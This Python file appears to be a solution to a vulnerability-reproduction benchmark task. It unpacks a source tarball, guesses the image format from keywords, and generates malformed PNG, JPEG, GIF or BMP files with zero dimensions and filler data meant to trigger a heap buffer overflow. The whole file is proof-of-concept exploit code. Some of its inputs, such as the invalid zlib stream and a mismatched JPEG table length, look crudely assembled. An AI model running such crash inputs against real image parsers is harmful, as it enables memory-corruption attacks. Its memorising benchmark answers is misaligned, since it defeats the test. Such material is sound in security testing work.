import os
import struct
import tarfile
import tempfile
import subprocess
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code to analyze
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for image-related files to understand format
            root_dir = Path(tmpdir)
            image_files = list(root_dir.rglob('*.c')) + list(root_dir.rglob('*.cpp')) + list(root_dir.rglob('*.h'))
            
            # Try to determine image format from source
            image_format = self._detect_image_format(image_files)
            
            # Generate PoC based on detected format
            if image_format == 'png':
                return self._generate_png_poc()
            elif image_format == 'jpeg' or image_format == 'jpg':
                return self._generate_jpeg_poc()
            elif image_format == 'gif':
                return self._generate_gif_poc()
            elif image_format == 'bmp':
                return self._generate_bmp_poc()
            else:
                # Default to PNG format (common for image vulnerabilities)
                return self._generate_png_poc()
    
    def _detect_image_format(self, source_files):
        """Try to detect the image format from source files."""
        for file_path in source_files:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read().lower()
                    
                    # Check for PNG signature in code
                    if 'png_' in content or '.png' in content or 'png_struct' in content:
                        return 'png'
                    # Check for JPEG
                    elif 'jpeg' in content or 'jpg' in content or 'jfif' in content:
                        return 'jpeg'
                    # Check for GIF
                    elif 'gif' in content or 'gif89a' in content or 'gif87a' in content:
                        return 'gif'
                    # Check for BMP
                    elif 'bmp' in content or 'bitmap' in content:
                        return 'bmp'
            except:
                continue
        return 'png'  # Default to PNG
    
    def _generate_png_poc(self):
        """Generate PNG with zero width/height that triggers heap overflow."""
        # PNG signature
        poc = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk with zero width
        ihdr_data = struct.pack('>I', 0)  # width = 0
        ihdr_data += struct.pack('>I', 100)  # height = 100
        ihdr_data += b'\x08\x02\x00\x00\x00'  # bit depth, color type, compression, filter, interlace
        
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', self._crc32(ihdr_chunk))
        
        poc += struct.pack('>I', len(ihdr_data))
        poc += ihdr_chunk
        poc += ihdr_crc
        
        # IDAT chunk with malformed data to trigger overflow
        # Large chunk that will cause buffer overflow when width is 0
        idat_data = b'\x78\x9c' + b'A' * 2900  # zlib header + filler
        idat_chunk = b'IDAT' + idat_data
        idat_crc = struct.pack('>I', self._crc32(idat_chunk))
        
        poc += struct.pack('>I', len(idat_data))
        poc += idat_chunk
        poc += idat_crc
        
        # IEND chunk
        iend_data = b''
        iend_chunk = b'IEND' + iend_data
        iend_crc = struct.pack('>I', self._crc32(iend_chunk))
        
        poc += struct.pack('>I', len(iend_data))
        poc += iend_chunk
        poc += iend_crc
        
        return poc
    
    def _generate_jpeg_poc(self):
        """Generate JPEG with zero dimensions."""
        # JPEG Start of Image
        poc = b'\xff\xd8'
        
        # JFIF APP0 marker
        poc += b'\xff\xe0'
        poc += struct.pack('>H', 16)  # Length
        poc += b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        
        # Define Quantization Table
        poc += b'\xff\xdb'
        poc += struct.pack('>H', 67)  # Length
        poc += b'\x00' + b'\x01' * 64
        
        # Start of Frame (SOF) with zero width
        poc += b'\xff\xc0'
        poc += struct.pack('>H', 17)  # Length
        poc += b'\x08'  # Precision
        poc += struct.pack('>H', 0)   # Height = 0
        poc += struct.pack('>H', 100) # Width = 100
        poc += b'\x03'  # Components
        
        # Component data
        for i in range(3):
            poc += struct.pack('B', i + 1)  # Component ID
            poc += b'\x11'  # Sampling factors
            poc += b'\x00'  # Quantization table
        
        # DHT, SOS, and image data
        poc += b'\xff\xc4'
        poc += struct.pack('>H', 418)  # Length
        poc += b'\x00' + b'\x10' * 16 + b'\x00' * 162
        
        # Start of Scan
        poc += b'\xff\xda'
        poc += struct.pack('>H', 12)
        poc += b'\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00'
        
        # Image data that triggers overflow
        poc += b'\x00' * 2400
        
        # End of Image
        poc += b'\xff\xd9'
        
        return poc
    
    def _generate_gif_poc(self):
        """Generate GIF with zero width."""
        # GIF Header
        poc = b'GIF89a'
        
        # Logical Screen Descriptor with zero width
        poc += struct.pack('<H', 0)   # Width = 0
        poc += struct.pack('<H', 100) # Height = 100
        poc += b'\xf7'  # GCT flags
        poc += b'\x00'  # Background color
        poc += b'\x00'  # Pixel aspect ratio
        
        # Global Color Table (minimal)
        poc += b'\x00\x00\x00\xff\xff\xff'
        
        # Application Extension
        poc += b'!\xff\x0bNETSCAPE2.0\x03\x01\x00\x00\x00'
        
        # Image Descriptor with zero width
        poc += b','
        poc += struct.pack('<H', 0)   # Left = 0
        poc += struct.pack('<H', 0)   # Top = 0
        poc += struct.pack('<H', 0)   # Width = 0
        poc += struct.pack('<H', 100) # Height = 100
        poc += b'\x00'  # No local color table
        
        # Image data that triggers overflow
        poc += b'\x08'  # LZW minimum code size
        poc += struct.pack('B', 255)  # Block size
        poc += b'A' * 255 * 10  # Fill with data
        poc += b'\x00'  # Terminator
        
        # GIF Trailer
        poc += b';'
        
        return poc
    
    def _generate_bmp_poc(self):
        """Generate BMP with zero width."""
        # BMP File Header
        poc = b'BM'
        poc += struct.pack('<I', 2936)  # File size
        poc += b'\x00\x00'  # Reserved
        poc += b'\x00\x00'  # Reserved
        poc += struct.pack('<I', 54)  # Pixel data offset
        
        # DIB Header
        poc += struct.pack('<I', 40)  # Header size
        poc += struct.pack('<I', 0)   # Width = 0
        poc += struct.pack('<I', 100) # Height = 100
        poc += struct.pack('<H', 1)   # Planes
        poc += struct.pack('<H', 24)  # Bits per pixel
        poc += struct.pack('<I', 0)   # Compression
        poc += struct.pack('<I', 0)   # Image size
        poc += struct.pack('<I', 2835)  # Horizontal resolution
        poc += struct.pack('<I', 2835)  # Vertical resolution
        poc += struct.pack('<I', 0)   # Colors in palette
        poc += struct.pack('<I', 0)   # Important colors
        
        # Pixel data that triggers overflow
        poc += b'\x00' * 2800
        
        return poc
    
    def _crc32(self, data):
        """Calculate CRC32 for PNG chunks."""
        crc = 0xffffffff
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xedb88320
                else:
                    crc >>= 1
        return crc ^ 0xffffffff